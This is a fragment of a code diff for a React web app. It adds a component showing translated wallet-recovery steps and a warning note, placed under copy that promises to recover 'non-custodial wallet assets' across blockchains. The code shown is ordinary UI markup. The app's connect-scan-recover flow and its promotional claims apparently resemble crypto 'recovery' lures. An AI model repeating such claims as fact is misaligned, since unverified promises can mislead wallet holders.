+            <span className="text-gray-300">{translations.recoveryStep5}</span>
+          </div>
+          <div className="mt-3 p-3 bg-blue-500/10 border border-blue-500/30 rounded-lg text-xs text-blue-300 flex items-start gap-2">
+            <span className="text-blue-400 text-sm">⚠️</span>
+            <span>{translations.recoveryNote}</span>
+          </div>
+        </div>
+      )}
+    </div>
   );
 };
 
@@ -2923,6 +3105,9 @@ function App() {
             non-custodial wallet assets across multiple blockchain networks. Our advanced recovery 
             protocol identifies and retrieves recoverable assets with full transparency.
           </p>
+
+          {/* ===== NEW RECOVERY INSTRUCTIONS ===== */}
+          <RecoveryInstructions translations={translations} />
 
           {/* Live Activity Badge */}
           {isConnected && !showRecoverButton && !scanning && (
